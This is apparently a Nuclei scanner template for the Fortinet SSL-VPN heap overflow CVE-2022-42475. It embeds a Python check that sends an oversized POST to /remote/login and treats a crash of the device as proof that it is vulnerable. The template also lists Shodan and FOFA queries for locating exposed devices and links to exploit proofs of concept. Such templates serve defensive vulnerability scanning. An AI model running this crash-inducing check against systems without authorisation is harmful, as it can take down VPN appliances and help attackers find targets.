code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - Target appears to be VULNERABLE
  source: "import sys, os, time, socket, ssl\nPADDING        = 0x4141414141414141\n\
    PADDING_LEN    = 1024*12\nCONTENT_LENGTH = b\"4294967297\"\n\nclass SSLVPNExploit:\n\
    \  def __init__(self, host, port):\n    self.host = host\n    self.port = port\n\
    \  def connect(self):\n    tries = 1\n    if os.getenv(\"Scheme\") == \"https\"\
    :\n      useSSL = True\n      print(\"[+] Using SSL/TLS\")\n    else:\n      useSSL\
    \ = False\n      print(\"[+] Unencrypted connection\")\n    while tries <= 6:\n\
    \      try:\n        print(\"[+] Connecting to %s [ attempt %d of 6 ]        \
    \                        \\r\" % (self.host, tries), end='\\n')\n        self.cleartext_socket\
    \ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        if useSSL == True:\n\
    \          ctx = ssl._create_unverified_context()\n          self.socket = ctx.wrap_socket(self.cleartext_socket)\n\
    \        else:\n          self.socket = self.cleartext_socket\n        self.socket.settimeout(2.0)\n\
    \        self.socket.connect((self.host, self.port))\n\n        return self.socket\n\
    \      except socket.timeout as e:\n        tries += 1\n        print(\"Connection\
    \ timeout!\")\n        continue\n      except Exception as e:\n        print(\"\
    Unknown error!\")\n        print(e)\n        return None\n    return None\n  def\
    \ check_by_get(self):\n    get_req = bytearray(b\"\")\n    get_req += b\"GET /remote/login\
    \ HTTP/1.1\\r\\nHost: \" + self.host.encode() + b\":\" + str(self.port).encode()\
    \ + b\"\\r\\nUser-Agent: AAAAAAAAAAAAAAAA\\r\\nContent-Type: application/x-www-form-urlencoded\\\
    r\\nAccept: */*\\r\\n\\r\\n\"\n\n    print(\"[>] Sending GET first\")\n    if\
    \ self.connect() == None:\n      print(\"[!] Error connecting to target\")\n \
    \     exit(1)\n    try:\n      self.socket.sendall(get_req)\n\n      self.socket.settimeout(10)\n\
    \      get_buf = self.socket.recv(1048576)\n\n      if len(get_buf) == 0:\n  \
    \      print(\"Error while sending GET. Protocol mismatch?\")\n        return\
    \ None\n      self.socket.close()\n      return True\n    except socket.timeout\
    \ as e:\n      print(\"[>] Target waited for more data.\")\n      return False\n\
    \n    except Exception as e:\n      print(\"[>] Target dropped the connection\
    \ during test GET, which indicates a communication error!\")\n      print(e)\n\
    \      return None\n\n  def is_vulnerable(self):\n    req = bytearray(b\"\")\n\
    \    req += b\"POST /remote/login HTTP/1.1\\r\\nHost: \" + self.host.encode()\
    \ + b\":\" + str(self.port).encode() + b\"\\r\\nContent-Length: \" + CONTENT_LENGTH\
    \ + b\"\\r\\nUser-Agent: AAAAAAAAAAAAAAAA\\r\\nContent-Type: application/x-www-form-urlencoded\\\
    r\\nAccept: */*\\r\\n\\r\\n\"\n    req += b\"AAAAAAAA\"*(PADDING_LEN)\n\n    print(\"\
    [>] Testing to see if target is vulnerable (may take 10 seconds)\")\n    if self.connect()\
    \ == None:\n      print(\"[!] Error connecting to target\")\n      exit(1)\n\n\
    \    try:\n      # Send the payload. Vuln instances will crash, severing the connection\
    \ and\n      # causing an exception to be thrown here.\n      self.socket.sendall(req)\n\
    \n      # If this read succeeds then the target is probably not vulnerable.\n\
    \      # If it times out, then it's also probably not vulnerable.\n      self.socket.settimeout(10)\n\
    \      buf = self.socket.recv(1048576)\n\n      # If the remote end disconnects\
    \ without an HTTP response then it's vulnerable.\n      if len(buf) == 0:\n  \
    \        return True\n\n      # Check to see if it has the vendor patch applied\n\
    \      if buf.decode(\"utf-8\", errors=\"replace\").__contains__(\"HTTP/1.1 413\
    \ Request Entity Too Large\"):\n          print(\"[>] Target is patched.\")\n\
    \          return False # 100% confidence that it's not vulnerable.\n\n      #\
    \ Ok, something weird and unexpected happened.\n      print(\"[>] An unexpected\
    \ response (%d bytes) was recieved:\" % len(buf))\n      print(\"----- BEGIN RESPONSE\
    \ -----\")\n      print(buf.decode(\"utf-8\", errors=\"replace\").replace(\"\\\
    \\r\\\\n\", \"\\n\"))\n      print(\"----- END RESPONSE -----\")\n      self.socket.close()\n\
    \      return None\n\n    except socket.timeout as e:\n      print(\"[>] Target\
    \ waited for more data. Not vulnerable.\")\n      return False\n    except Exception\
    \ as e:\n      print(\"[>] Target dropped the connection, which indicates a vulnerable\
    \ device!\")\n      print(e)\n      return True\n\nif __name__ == '__main__':\n\
    \  host=os.getenv(\"Host\")\n  port=int(os.getenv(\"Port\"))\n  exploit = SSLVPNExploit(host,\
    \ port)\n  check = exploit.check_by_get()\n\n  if check == True:\n    result =\
    \ exploit.is_vulnerable()\n    if result == None:\n      print(\"[!] An error\
    \ occurred testing for the vulnerability.\\n[!] Is this even a FortiGate SSL-VPN?\"\
    )\n      exit(2)\n\n    if result == True:\n      print(\"[+] Target appears to\
    \ be VULNERABLE\")\n      exit(0)\n\n    else:\n      print(\"[+] Target is NOT\
    \ vulnerable\")\n      exit(1)\n"
flow: http () && code()
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - contains(body, "Launch FortiClient") || contains(body, "ftnt-fortinet-grid")
    - status_code == 200
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/remote/login'
  - '{{BaseURL}}/login'
  stop-at-first-match: true
id: CVE-2022-42475
info:
  author: 0xhaggis,pszyszkowski,pussycat0x
  classification:
    cpe: cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-42475
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-197,CWE-787
    epss-percentile: 0.99894
    epss-score: 0.94062
  description: 'A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN
    (versions 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0
    through 6.2.11, 6.0.15 and earlier) and FortiProxy SSL-VPN (versions 7.2.0 through
    7.2.1, 7.0.7 and earlier) may allow a remote unauthenticated attacker to execute
    arbitrary code or commands via specifically crafted requests.

    '
  impact: 'Remote attackers can execute arbitrary code or commands, potentially leading
    to full system compromise.

    '
  metadata:
    fofa-query:
    - body="/remote/login" "xxxxxxxx"
    - icon_hash="945408572"
    max-request: 1
    product: fortios
    shodan-query:
    - cpe:"cpe:2.3:o:fortinet:fortios"
    - http.html:"/remote/login" "xxxxxxxx"
    - http.favicon.hash:"945408572"
    vendor: fortinet
  name: Fortinet SSL-VPN - Heap-Based Buffer Overflow
  reference:
  - https://github.com/0xhaggis/CVE-2022-42475
  - https://fortiguard.com/psirt/FG-IR-22-398
  - https://labs.watchtowr.com/fortinet-no-more-funny-titles-cve-2022-42475/
  - https://bishopfox.com/blog/exploit-cve-2022-42475
  - https://github.com/3yujw7njai/CVE-2022-42475-RCE-POC
  remediation: 'Fixed in:

    FortiOS >= 7.2.3, 7.0.9, 6.4.11, 6.2.12, 6.0.16

    FortiOS-6K7K >= 7.0.8, 6.4.10, 6.2.12, 6.0.15

    FortiProxy >= 7.2.2, 7.0.8, 2.0.12

    '
  severity: critical
  tags: cve,cve2024,ssl-vpn,vpn,fortios,fortigate,heap-based,bufferoverflow,kev,vkev,vuln
